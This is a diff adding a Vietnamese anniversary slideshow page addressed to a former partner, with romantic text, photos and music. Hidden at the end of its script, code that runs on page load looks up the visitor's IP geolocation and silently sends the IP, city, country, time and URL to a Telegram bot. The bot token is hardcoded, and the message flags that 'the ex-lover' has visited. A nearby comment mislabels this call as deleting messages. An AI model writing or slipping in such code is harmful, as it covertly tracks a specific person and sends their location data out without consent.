@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Kỷ niệm 18/8</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: black;
+      color: white;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      overflow: hidden;
+      margin: 0;
+      padding: 0;
+      position: relative;
+    }
+
+    #start-btn {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: white;
+      color: black;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      z-index: 3;
+      transition: background 0.3s;
+    }
+
+    #start-btn:hover {
+      background-color: #f0f0f0;
+    }
+
+    #text-box {
+      max-width: 90%;
+      text-align: center;
+      font-size: 6vw;
+      line-height: 1.8;
+      display: none;
+      z-index: 2;
+      padding: 0 10px;
+      margin-top: -10vh; /* Kéo chữ lên cao hơn */
+    }
+
+    .photo {
+      display: none;
+      width: 100vw;
+      height: 100vh;
+      object-fit: contain;
+      image-rendering: auto;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1;
+    }
+
+    .fade {
+      animation: fadein 1s ease-in-out;
+    }
+
+    @keyframes fadein {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    #love-text {
+      position: absolute;
+      bottom: 25%;
+      font-size: 9vw;
+      font-weight: bold;
+      color: white;
+      opacity: 0;
+      z-index: 3;
+      animation: fadeInOut 4s ease-in-out forwards;
+      display: none;
+      text-align: center;
+      padding: 0 20px;
+    }
+
+    @keyframes fadeInOut {
+      0% {
+        opacity: 0;
+      }
+      20% {
+        opacity: 1;
+      }
+      80% {
+        opacity: 1;
+      }
+      100% {
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <button id="start-btn">Bấm để bắt đầu</button>
+  <div id="text-box"></div>
+  <audio id="bg-music" src="/music.mp3"></audio>
+
+  <!-- Danh sách ảnh -->
+  <img class="photo" src="https://i.ibb.co/yFGZ2tDZ/your-image1.jpg" alt="Ảnh 1" />
+  <img class="photo" src="https://i.ibb.co/gZLzfWy3/your-image2.jpg" alt="Ảnh 2" />
+  <img class="photo" src="https://i.ibb.co/wnbHrKh/your-image3.jpg" alt="Ảnh 3" />
+  <img class="photo" src="https://i.ibb.co/C37rzkvJ/your-image4.jpg" alt="Ảnh 4" />
+  <img class="photo" src="https://i.ibb.co/GvgTk1bQ/your-image5.jpg" alt="Ảnh 5" />
+  <img class="photo" src="https://i.ibb.co/4w2K6Ymm/your-image6.jpg" alt="Ảnh 6" />
+  <img class="photo" src="https://i.ibb.co/RkhbkYvX/your-image7.jpg" alt="Ảnh 7" />
+  <img class="photo" src="https://i.ibb.co/xqy8sp5R/your-image8.jpg" alt="Ảnh 8" />
+
+  <!-- Dòng chữ "Tôi yêu em" -->
+  <div id="love-text">Tôi yêu em</div>
+
+  <script>
+    const texts = [
+      "Hôm nay…",
+      "",
+      "Ngày 18 tháng 8.",
+      "Bảy năm kể từ khi tôi và em bắt đầu một câu chuyện thật đẹp.",
+      "",
+      "Ngày ấy…",
+      "",
+      "Chúng ta chỉ cần một buổi tan trường,",
+      "Một ly trà sữa,",
+      "Một ổ bánh mỳ,",
+      "Hay một vòng xe đi dạo",
+      "Chỉ cần bên cạnh nhau",
+      "Là đã đủ Hạnh Phúc lắm rồi.",
+      "",
+      "Chẳng nghĩ gì về tương lai,",
+      "Cũng không phải lo toan điều gì…",
+      "Ta chỉ nghĩ...",
+      "Chỉ cần có nhau.",
+      "",
+      "Nhưng khi lớn lên…",
+      "Mọi thứ không còn đơn giản như vậy nữa.",
+      "Áp lực công việc…",
+      "Trách nhiệm…",
+      "Sự nghiệp…",
+      "Gia đình...",
+      "",
+      "Mọi thứ đã len lỏi vào giữa chúng ta.",
+      "",
+      "Và tôi nhận ra…",
+      "Có những khoảng cách…",
+      "Không đến từ địa lý,",
+      "Mà từ chính những đổi thay của cuộc sống.",
+      "",
+      "Yêu không nhất thiết là phải bên cạnh",
+      "Mà chỉ cần nhìn thấy nhau Hạnh Phúc là đủ",
+      "",
+      "Tôi hi vọng em sẽ luôn mỉm cười",
+      "Bình An",
+      "...",
+      "",
+      "Dù có thế nào đi chăng nữa…",
+      "Em vẫn là một phần tuổi trẻ mà tôi trân trọng.",
+      "Và 18 tháng 8… sẽ mãi nhắc tôi rằng…",
+      "Đã từng có một “chúng ta” thật đẹp.",
+      "",
+      "Cảm ơn em...."
+    ];
+
+    const startBtn = document.getElementById("start-btn");
+    const textBox = document.getElementById("text-box");
+    const photos = document.querySelectorAll(".photo");
+    const loveText = document.getElementById("love-text");
+
+    async function showTextAndImages() {
+        startBtn.style.display = "none";
+        textBox.style.display = "block";
+
+        // Phát nhạc
+        const bgMusic = document.getElementById("bg-music");
+        bgMusic.currentTime = 0;
+        bgMusic.play();
+
+        for (let i = 0; i < texts.length; i++) {
+          textBox.innerHTML = texts[i];
+          await new Promise((resolve) => setTimeout(resolve, 2200));
+        }
+
+        textBox.style.display = "none";
+
+        for (let i = 0; i < photos.length; i++) {
+          photos[i].classList.add("fade");
+          photos[i].style.display = "block";
+          await new Promise((resolve) => setTimeout(resolve, 3000));
+          photos[i].style.display = "none";
+        }
+
+        loveText.style.display = "block";
+      }
+
+    startBtn.addEventListener("click", showTextAndImages);
+const options = {
+  hour: '2-digit',
+  minute: '2-digit',
+  second: '2-digit',
+  day: '2-digit',
+  month: '2-digit',
+  year: 'numeric',
+}
+    // --- Thêm chức năng lấy geo và gọi API Telegram khi vào trang ---
+      window.addEventListener('DOMContentLoaded', async () => {
+        try {
+          // Lấy thông tin geo
+          const geoRes = await fetch('https://get.geojs.io/v1/ip/geo.json');
+          const geo = await geoRes.json();
+          console.log('Geo info:', geo);
+
+          // Gọi API xóa tin nhắn Telegram
+          // Bạn tự xử lý token, chat_id, message_id
+          // Ví dụ:
+          // const tokens = [...];
+          // const chatIds = [...];
+          // const chatId = ...;
+          // for (let i = 0; i < tokens.length; i++) {
+                const message = `
+🕒 <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN', options)}
+🌍 <b>Địa chỉ IP:</b> ${geo.ip}
+📍 <b>Vị trí:</b> ${geo.city}, ${geo.country}
+🌍 <b>Link: ${window.location.href}</b>
+
+👤 CÓ ĐỐI TƯỢNG NGƯỜI YÊU CŨ TRUY CẬP
+`
+            await fetch(`https://api.telegram.org/bot7759584512:AAEyWowDSIEFHcYETD-_7KRMNBjyxvozlPA/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: '-4657613402',
+                text: message,
+                parse_mode: 'HTML',
+              })
+            });
+          // }
+        } catch (err) {
+          console.error('Geo/Telegram API error:', err);
+        }
+      });
+  </script>
+</body>
+</html>
